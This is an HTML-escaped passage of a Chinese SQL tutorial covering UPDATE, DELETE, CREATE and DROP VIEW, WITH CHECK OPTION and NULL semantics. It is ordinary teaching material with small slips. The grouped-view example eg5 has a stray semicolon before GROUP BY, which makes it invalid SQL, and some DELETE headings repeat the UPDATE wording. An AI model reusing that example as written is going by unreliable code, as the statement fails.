&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2修改多个元组的值&#34;&gt;情况2：修改多个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3带子查询的修改语句&#34;&gt;情况3：带子查询的修改语句
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;删除语句delete语句&#34;&gt;删除语句&amp;ndash;DELETE语句
&lt;/h2&gt;&lt;h4 id=&#34;一般格式-4&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DELETE&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FROM 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WHERE语句若省略，则表示删除表中所有元组&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1删除某一个元组的值&#34;&gt;情况1：删除某一个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2修改多个元组的值-1&#34;&gt;情况2：修改多个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3带子查询的修改语句-1&#34;&gt;情况3：带子查询的修改语句
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;view-视图&#34;&gt;VIEW 视图
&lt;/h2&gt;&lt;h3 id=&#34;建立视图&#34;&gt;建立视图
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-5&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE VIEW 视图名 (列名1,列名n)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;AS 子查询&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WITH CHECK OPTION;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若省略视图名后的列名，则该视图由子查询中SELECT的目标列字段组成&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若添加WITH句，则表示对视图进行增删改时要满足子查询中的条件表达式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:RED&#34;&gt;在以下情况中必须明确指定组成视图的列名：&lt;/span&gt;&lt;/strong&gt;
&lt;strong&gt;1.某个目标列不是单纯的列名，而是聚集函数或列表达式&lt;/strong&gt;
&lt;strong&gt;2.多表连接时选出了几个同名列作为视图的字段&lt;/strong&gt;
&lt;strong&gt;3.需要在视图中为某个列启用新的更合适的名字&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;行列子集视图&lt;/span&gt;：由单个基本表导出，仅去掉了基本表的某些行和某些列，但保留了主码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若某些视图是建立在另一个表的全部属性列上的（视图与基本表的各列是一一对应的）那么当修改基本表的结构时，基本表和视图的映像关系会被破坏。这种情况最好在修改基本表后删除该视图，然后重建该视图&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1建立完全视图&#34;&gt;情况1：建立完全视图
&lt;/h4&gt;&lt;p&gt;eg1.建立C1为1时TAB1的视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2建立带有增删改条件的视图&#34;&gt;情况2：建立带有增删改条件的视图
&lt;/h4&gt;&lt;p&gt;eg2.建立C4为4时TAB1的视图，并且以后每次增删改时都要满足C4=4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WITH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;CHECK&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OPTION&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3由视图新建视图&#34;&gt;情况3：由视图新建视图
&lt;/h4&gt;&lt;p&gt;eg3.建立在一个或多个已定义的视图上&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况4带有派生数据的视图&#34;&gt;情况4：带有派生数据的视图
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;减少冗余数据，定义基本表时一般只存放基本数据。当需要使用计算得出的派生数据时，可以设置在视图&lt;/strong&gt;
&lt;strong&gt;中的派生属性列上，也称为虚拟列。带虚拟列的视图也称为带表达式的视图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg4.建立有派生数据的视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB4&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;new_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况5带有聚集函数和group-by的分组视图&#34;&gt;情况5：带有聚集函数和GROUP BY的分组视图
&lt;/h4&gt;&lt;p&gt;eg5.建立包含聚集函数的分组视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB5&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;删除视图&#34;&gt;删除视图
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP VIEW 视图名 CASCADE;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果使用了CASCADE级联删除语句，则将把该视图导出的所有视图一并删除&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;查询和更新视图&#34;&gt;查询和更新视图
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;视图定义后，对视图进行查询和更新的语句和语法与基本表相同&lt;/strong&gt;
&lt;strong&gt;视图的查询与更新最终都会转换为对基本表的查询和更新，这一过程也被称为视图消解&lt;/strong&gt;
&lt;strong&gt;一般来说，行列子集视图的查询和更新都可以顺利转换，其他则不一定&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;空值&#34;&gt;空值
&lt;/h2&gt;&lt;h3 id=&#34;判断属性为空值&#34;&gt;判断属性为空值
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这部分和WHERE语句里面空值判断一样啦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;属性 IS NULL;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;属性 IS NOT NULL;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查找TAB1中名字为空的学生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;空值的运算&#34;&gt;空值的运算
&lt;/h3&gt;&lt;h4 id=&#34;算数运算&#34;&gt;算数运算
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;空值与另一个值的算术运算结果为空值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;比较运算&#34;&gt;比较运算
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;空值与另一个值的比较运算结果为 UNKNOWN&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
